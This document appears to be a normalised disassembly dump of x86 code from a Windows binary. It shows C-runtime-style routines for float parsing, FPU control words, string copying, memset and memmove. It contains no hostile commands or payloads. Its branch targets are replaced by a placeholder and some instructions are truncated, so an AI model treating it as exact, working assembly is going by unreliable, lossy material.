jne r-xdata
xor eax eax
pop esi
retn
inc esi
cmp esi 0x3
jge r-xdata
push 0x1
pop eax
pop esi
retn
lea eax [ eax + esi * 4 ]
inc esi
add eax 0x4
cmp esi 0x3
jl r-xdata
cmp [ eax ] 0x0
jne r-xdata
sub_40612f
mov eax [ esp + 0x8 ]
push ebx
push esi
push edi
push 0x20
mov ebx [ esp + 0x14 ]
cdq
pop ecx
idiv ecx
mov esi eax
mov eax [ esp + 0x14 ]
cdq
idiv ecx
lea edi [ ebx + esi * 4 ]
push edi
push 0x1f
pop ecx
push 0x1
pop eax
sub ecx edx
shl eax cl
push eax
push [ edi ]
call sub_40800e
add esp 0xc
dec esi
js r-xdata
pop edi
pop esi
pop ebx
retn
lea edi [ ebx + esi * 4 ]
push edi
push 0x1
push [ edi ]
call sub_40800e
add esp 0xc
dec esi
sub edi 0x4
test esi esi
jge r-xdata
test eax eax
je r-xdata
sub_406185
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
lea edi [ eax - 0x1 ]
push 0x20
pop ecx
and [ ebp - 0x4 ] 0x0
lea ebx [ edi + 0x1 ]
push 0x20
mov eax ebx
pop esi
cdq
idiv ecx
push 0x1f
mov ecx eax
mov eax ebx
cdq
idiv esi
mov eax [ ebp + 0x8 ]
pop esi
push 0x1
mov [ ebp - 0x8 ] ecx
lea eax [ eax + ecx * 4 ]
mov [ ebp + 0xc ] eax
sub esi edx
pop edx
mov ecx esi
shl edx cl
test [ eax ] edx
je r-xdata
or edx 0xffffffff
mov ecx esi
shl edx cl
push 0x3
pop ecx
and [ eax ] edx
mov eax [ ebp - 0x8 ]
inc eax
cmp eax ecx
jge r-xdata
inc ebx
push ebx
push [ ebp + 0x8 ]
call sub_4060e6
pop ecx
test eax eax
pop ecx
jne r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
mov edx [ ebp + 0x8 ]
sub ecx eax
lea edi [ edx + eax * 4 ]
xor eax eax
[ edi ]
mov eax [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_40612f
pop ecx
mov [ ebp - 0x4 ] eax
pop ecx
sub_406211
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push esi
push 0x3
sub ecx eax
pop edx
mov esi [ eax ]
mov [ ecx + eax ] esi
add eax 0x4
dec edx
jne r-xdata
pop esi
retn
sub_406238
mov eax [ esp + 0x4 ]
xor ecx ecx
xor eax eax
retn
inc ecx
add eax 0x4
cmp ecx 0x3
jl r-xdata
cmp [ eax ] 0x0
jne r-xdata
push 0x1
pop eax
retn
sub_406253
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
push 0x20
mov edi [ ebp + 0x8 ]
pop ebx
or esi 0xffffffff
cdq
mov ecx ebx
mov [ ebp - 0x4 ] 0x3
idiv ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0xc ]
cdq
idiv ecx
and [ ebp + 0xc ] 0x0
mov ecx edx
shl esi cl
sub ebx edx
not esi
mov eax [ edi ]
mov ecx eax
and ecx esi
mov [ ebp - 0x8 ] ecx
mov ecx edx
shr eax cl
or eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp - 0x8 ]
mov ecx ebx
add edi 0x4
shl eax cl
dec [ ebp - 0x4 ]
mov [ ebp + 0xc ] eax
jne r-xdata
mov edi [ ebp - 0xc ]
push 0x2
pop ebx
mov esi edi
push 0x8
pop ecx
shl esi 0x2
mov eax [ ebp + 0x8 ]
and [ ecx + eax ] 0x0
mov edx [ ebp + 0x8 ]
mov eax ecx
sub eax esi
mov eax [ eax + edx ]
mov [ ecx + edx ] eax
jmp r-xdata
cmp ebx edi
jl r-xdata
pop edi
pop esi
pop ebx
leave
retn
dec ebx
sub ecx 0x4
jns r-xdata
sub_4062e0
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
movzx ecx [ eax + 0xa ]
mov ebx ecx
and ecx 0x8000
mov [ ebp + 0x8 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
mov edi [ ebp + 0x10 ]
and ebx 0x7fff
sub ebx 0x3fff
mov [ ebp - 0x8 ] ecx
shl eax 0x10
cmp ebx 0xffffc001
mov [ ebp - 0x4 ] eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_406211
push [ edi + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_406185
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
xor esi esi
push eax
call sub_406238
test eax eax
pop ecx
jne r-xdata
mov eax [ edi + 0x4 ]
mov ecx eax
sub ecx [ edi + 0x8 ]
cmp ebx ecx
jge r-xdata
inc ebx
xor eax eax
lea eax [ ebp - 0xc ]
push eax
call sub_40622c
pop ecx
cmp ebx eax
jg r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_40622c
pop ecx
jmp r-xdata
cmp edi 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] esi
mov [ ecx ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ edi + 0xc ]
mov edi [ edi + 0x10 ]
shl esi cl
mov ecx [ ebp + 0x8 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or esi ecx
or esi [ ebp - 0xc ]
cmp edi 0x40
jne r-xdata
cmp ebx [ edi ]
jl r-xdata
sub eax ebx
mov esi eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_406211
lea eax [ ebp - 0xc ]
push esi
push eax
call sub_406253
push [ edi + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_406185
mov eax [ edi + 0xc ]
inc eax
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_406253
add esp 0x20
xor esi esi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] esi
push [ edi + 0xc ]
mov esi [ edi + 0x14 ]
and [ ebp - 0x9 ] 0x7f
lea eax [ ebp - 0xc ]
push eax
add esi ebx
call sub_406253
pop ecx
pop ecx
lea eax [ ebp - 0xc ]
push eax
call sub_40622c
push [ edi + 0xc ]
or [ ebp - 0x9 ] 0x80
lea eax [ ebp - 0xc ]
push eax
call sub_406253
mov esi [ edi + 0x14 ]
add esp 0xc
add esi [ edi ]
push 0x1
jmp r-xdata
push 0x2
pop eax
jmp r-xdata
sub_406478
push ebp
mov ebp esp
sub esp 0xc
xor eax eax
push eax
push eax
push eax
push eax
push [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_4064d2
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_40644c
add esp 0x24
leave
retn
sub_4064a5
push ebp
mov ebp esp
sub esp 0xc
xor eax eax
push eax
push eax
push eax
push eax
push [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_4064d2
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_406462
add esp 0x24
leave
retn
sub_4064d2
push ebp
mov ebp esp
sub esp 0x5c
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
lea eax [ ebp - 0x5c ]
push 0x1
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp + 0x10 ] edi
inc edi
jmp r-xdata
cmp cl 0x9
je r-xdata
mov cl [ edi ]
cmp cl 0x20
je r-xdata
cmp cl 0xa
je r-xdata
cmp cl 0xd
jne r-xdata
push 0x4
pop esi
cmp eax 0xa
je r-xdata
jmp [ eax * 4 + jump_table_406973 ]
mov eax [ ebp + 0xc ]
cmp [ ebp - 0x10 ] 0x0
mov [ eax ] edi
je r-xdata
jmp r-xdata
cmp bl 0x31
jl r-xdata
cmp bl 0x31
mov [ ebp - 0x10 ] edx
jl r-xdata
cmp bl 0x31
jl r-xdata
mov [ ebp - 0x10 ] edx
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x24 ] edx
jne r-xdata
cmp [ rw-data ] edx
mov [ ebp - 0x24 ] edx
jle r-xdata
lea ecx [ edi - 0x2 ]
cmp bl 0x31
mov [ ebp + 0x10 ] ecx
jl r-xdata
mov [ ebp - 0x20 ] edx
cmp bl 0x31
jl r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x1
xor esi esi
xor edx edx
xor eax eax
xor esi esi
xor ebx ebx
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4 ] eax
jbe r-xdata
mov bl [ edi ]
inc edi
cmp eax 0xb
ja r-xdata
cmp bl [ rw-data ]
jne r-xdata
cmp bl 0x39
jg r-xdata
cmp bl [ rw-data ]
je r-xdata
cmp bl 0x39
jle r-xdata
cmp bl [ rw-data ]
je r-xdata
cmp bl 0x39
jle r-xdata
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax esi
movzx eax bl
push esi
push eax
call sub_4037d8
pop ecx
pop ecx
push 0x1
pop edx
jmp r-xdata
cmp [ rw-data ] edx
jle r-xdata
cmp bl 0x30
jne r-xdata
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax esi
movzx eax bl
push esi
push eax
call sub_4037d8
pop ecx
pop ecx
push 0x1
pop edx
jmp r-xdata
movsx eax bl
sub eax 0x2b
je r-xdata
cmp bl 0x39
jle r-xdata
cmp bl 0x31
jl r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp bl 0x30
jne r-xdata
cmp bl 0x39
jg r-xdata
push 0xa
dec edi
pop eax
movsx eax bl
lea ecx [ edi - 0x1 ]
sub eax 0x2b
mov [ ebp + 0x10 ] ecx
je r-xdata
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax 0x4
movzx eax bl
push 0x4
push eax
call sub_4037d8
pop ecx
pop ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
or eax [ ebp - 0x28 ]
pop edi
mov [ ecx + 0x6 ] esi
mov [ ecx + 0x2 ] ebx
mov [ ecx + 0xa ] ax
mov eax [ ebp - 0x14 ]
pop esi
mov [ ecx ] dx
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
cmp [ ebp - 0x45 ] 0x5
jl r-xdata
movsx eax bl
sub eax 0x2b
je r-xdata
push 0x5
jmp r-xdata
push 0x3
jmp r-xdata
mov eax esi
jmp r-xdata
cmp bl 0x2b
je r-xdata
cmp bl 0x30
jne r-xdata
cmp bl [ rw-data ]
jne r-xdata
cmp [ ebp - 0x4 ] 0x19
jae r-xdata
test eax eax
je r-xdata
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax esi
movzx eax bl
push esi
push eax
call sub_4037d8
pop ecx
pop ecx
push 0x1
pop edx
jmp r-xdata
dec [ ebp - 0x8 ]
mov bl [ edi ]
inc edi
jmp r-xdata
mov edi [ ebp + 0x10 ]
jmp r-xdata
mov eax esi
jmp r-xdata
test eax eax
je r-xdata
push 0x7
dec eax
dec eax
je r-xdata
push 0x9
dec edi
jmp r-xdata
cmp bl 0x39
jg r-xdata
cmp bl 0x30
jne r-xdata
jmp r-xdata
dec eax
dec eax
jne r-xdata
mov [ ebp - 0x1c ] esi
movsx ecx bl
lea eax [ esi + esi * 4 ]
lea esi [ ecx + eax * 2 - 0x30 ]
cmp esi 0x1450
jg r-xdata
test eax eax
je r-xdata
xor edx edx
xor eax eax
xor esi esi
xor ebx ebx
jmp r-xdata
dec eax
cmp [ eax ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
dec eax
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebp - 0x45 ]
and [ ebp - 0x28 ] 0x0
push 0x2
pop eax
jmp r-xdata
dec eax
dec eax
je r-xdata
pop eax
jmp r-xdata
pop eax
dec edi
push 0xb
jmp r-xdata
cmp bl 0x2d
je r-xdata
mov eax edx
jmp r-xdata
cmp bl 0x2b
je r-xdata
inc [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
inc [ ebp - 0x4 ]
sub bl 0x30
inc [ ebp - 0xc ]
mov [ eax ] bl
jmp r-xdata
cmp [ ebp - 0x4 ] 0x19
jae r-xdata
test eax eax
je r-xdata
dec edi
jmp r-xdata
or [ ebp - 0x18 ] 0xffffffff
push 0x7
pop eax
jmp r-xdata
sub eax 0x3
jne r-xdata
jmp r-xdata
push 0x8
jmp r-xdata
mov edi ecx
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax 0x4
movzx eax bl
push 0x4
push eax
call sub_4037d8
pop ecx
pop ecx
jmp r-xdata
mov esi 0x1451
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x5c ]
push [ ebp - 0x4 ]
push eax
call sub_4080e8
mov eax [ ebp - 0x1c ]
xor ecx ecx
add esp 0xc
cmp [ ebp - 0x18 ] ecx
jge r-xdata
dec [ ebp - 0x4 ]
inc [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jbe r-xdata
push 0x2
mov [ ebp - 0x28 ] 0x8000
pop eax
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp bl 0x30
je r-xdata
cmp bl 0x2d
je r-xdata
cmp [ rw-data ] edx
jle r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
mov eax [ ebp - 0xc ]
inc [ ebp - 0x4 ]
sub bl 0x30
inc [ ebp - 0xc ]
dec [ ebp - 0x8 ]
mov [ eax ] bl
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
cmp [ ebp - 0x30 ] 0x0
je r-xdata
xor ebx ebx
mov eax 0x7fff
mov esi 0x80000000
xor edx edx
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
add eax [ ebp - 0x8 ]
cmp [ ebp - 0x20 ] ecx
jne r-xdata
neg eax
jmp r-xdata
cmp bl 0x43
jle r-xdata
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
xor edx edx
xor eax eax
xor esi esi
xor ebx ebx
mov [ ebp - 0x14 ] 0x1
cmp [ ebp - 0x24 ] ecx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp bl 0x45
jle r-xdata
cmp eax 0x1450
jle r-xdata
sub eax [ ebp + 0x1c ]
push 0x6
jmp r-xdata
cmp bl 0x63
jle r-xdata
cmp eax 0xffffebb0
jge r-xdata
mov [ ebp - 0x2c ] 0x1
cmp bl 0x65
jg r-xdata
push [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_4083cf
mov edx [ ebp - 0x40 ]
mov ebx [ ebp - 0x3e ]
mov esi [ ebp - 0x3a ]
mov eax [ ebp - 0x36 ]
add esp 0xc
jmp r-xdata
mov [ ebp - 0x30 ] 0x1
jmp r-xdata
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0x10 ]
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x10 ]
sub_4069a3
push ebp
mov ebp esp
push ecx
push esi
fwait
fnstcw [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_4069ee
mov esi eax
mov eax [ ebp + 0xc ]
not eax
and esi eax
mov eax [ ebp + 0x8 ]
and eax [ ebp + 0xc ]
or esi eax
push esi
call sub_406a80
pop ecx
mov [ ebp + 0xc ] eax
pop ecx
fldcw [ ebp + 0xc ]
mov eax esi
pop esi
leave
retn
sub_4069ee
push ebx
mov ebx [ esp + 0x8 ]
xor eax eax
push ebp
test bl 0x1
push edi
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop eax
test bl 0x8
je r-xdata
or al 0x8
test bl 0x10
je r-xdata
or al 0x4
test bl 0x20
je r-xdata
or al 0x2
test bl 0x2
je r-xdata
or al 0x1
movzx ecx bx
push esi
mov edx ecx
mov esi 0xc00
mov edi 0x300
and edx esi
mov ebp 0x200
je r-xdata
or eax 0x80000
and ecx edi
pop esi
je r-xdata
cmp edx 0x400
je r-xdata
or eax 0x20000
cmp ecx ebp
jne r-xdata
or ah 0x1
cmp edx 0x800
je r-xdata
retn
or eax 0x40000
pop edi
pop ebp
test bh 0x10
pop ebx
je r-xdata
or eax 0x10000
jmp r-xdata
or eax ebp
jmp r-xdata
cmp edx esi
jne r-xdata
or eax edi
jmp r-xdata
sub_406a80
push ebx
mov ebx [ esp + 0x8 ]
xor eax eax
push esi
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
push 0x1
pop eax
test bl 0x4
je r-xdata
or al 0x4
test bl 0x2
je r-xdata
or al 0x8
test bl 0x1
je r-xdata
or al 0x10
test ebx 0x80000
je r-xdata
or al 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
mov esi 0x200
je r-xdata
or al 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or ah 0x4
cmp ecx esi
je r-xdata
retn
or ah 0x10
pop esi
test ebx 0x40000
pop ebx
je r-xdata
or eax esi
jmp r-xdata
or ah 0x8
jmp r-xdata
cmp ecx edx
jne r-xdata
or ah 0xc
jmp r-xdata
sub_406b09
push ebp
mov ebp esp
mov edx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ edx + 0xc ]
push edi
lea edi [ esi + 0x1 ]
mov [ esi ] 0x30
test ebx ebx
mov eax edi
jle r-xdata
and [ eax ] 0x0
test ebx ebx
jl r-xdata
mov [ ebp + 0x8 ] ebx
xor ebx ebx
cmp [ esi ] 0x31
jne r-xdata
cmp [ ecx ] 0x35
jl r-xdata
push 0x30
pop edx
movsx edx dl
inc ecx
jmp r-xdata
push edi
call sub_403910
inc eax
push eax
push edi
push esi
call sub_406df0
add esp 0x10
inc [ edx + 0x4 ]
jmp r-xdata
dec eax
cmp [ eax ] 0x39
jne r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
mov edx [ ebp + 0x10 ]
mov [ eax ] dl
inc eax
dec [ ebp + 0x8 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc [ eax ]
mov [ eax ] 0x30
jmp r-xdata
sub_406b80
push ebp
mov ebp esp
sub esp 0x28
push esi
lea eax [ ebp + 0x8 ]
push edi
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_406bdc
pop ecx
lea eax [ ebp - 0x28 ]
pop ecx
lea esi [ ebp - 0xc ]
push eax
push 0x0
push 0x11
sub esp 0xc
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_40844b
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
movsx eax [ ebp - 0x26 ]
mov [ esi ] eax
movsx eax [ ebp - 0x28 ]
mov [ esi + 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push edi
call sub_406ca0
add esp 0x20
mov [ esi + 0xc ] edi
mov eax esi
pop edi
pop esi
leave
retn
sub_406bdc
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
push ebx
push esi
push edi
mov ax [ edx + 0x6 ]
mov edi 0x7ff
mov ecx eax
and eax 0x8000
shr ecx 0x4
and ecx edi
mov [ ebp + 0xc ] eax
mov eax [ edx + 0x4 ]
mov edx [ edx ]
movzx ebx cx
mov esi 0x80000000
and eax 0xfffff
test ebx ebx
mov [ ebp - 0x4 ] esi
je r-xdata
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp ebx edi
je r-xdata
lea edi [ ecx + 0x3c01 ]
mov [ ebp - 0x4 ] ebx
cmp edx ebx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
lea edi [ ecx + 0x3c00 ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
or ecx edi
mov [ eax + 0x8 ] cx
mov edx [ eax ]
add ecx ecx
mov ebx edx
shr ebx 0x1f
or ebx ecx
lea ecx [ edx + edx ]
mov [ eax ] ecx
mov [ eax + 0x4 ] ebx
add edi 0xffff
mov ecx ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] bx
jmp r-xdata
mov ecx edx
shr ecx 0x15
shl eax 0xb
or ecx eax
mov eax [ ebp + 0x8 ]
or ecx [ ebp - 0x4 ]
shl edx 0xb
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
test esi ecx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_406ca0
push edi
mov edi [ esp + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
test dh dh
je r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_406cb0
mov ecx [ esp + 0x4 ]
push edi
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea edi [ ecx - 0x1 ]
jmp r-xdata
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x4 ]
test ah ah
je r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
lea edi [ ecx - 0x3 ]
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x2 ]
jmp r-xdata
test eax 0xff000000
je r-xdata
test dh dh
je r-xdata
jmp r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_406d90
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
mov [ edi ] al
inc edi
dec edx
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
inc edi
dec ecx
jne r-xdata
sub_406d95
dec esp
and al 0x4
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
mov [ edi ] al
inc edi
dec edx
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
inc edi
dec ecx
jne r-xdata
sub_406df0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_406e50 ]
jmp [ ecx * 4 + jump_table_406ecc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_406f38 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_406f38 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_4070d0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_406fd8 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4070d0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_406f38 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_406f38 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_406f38 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
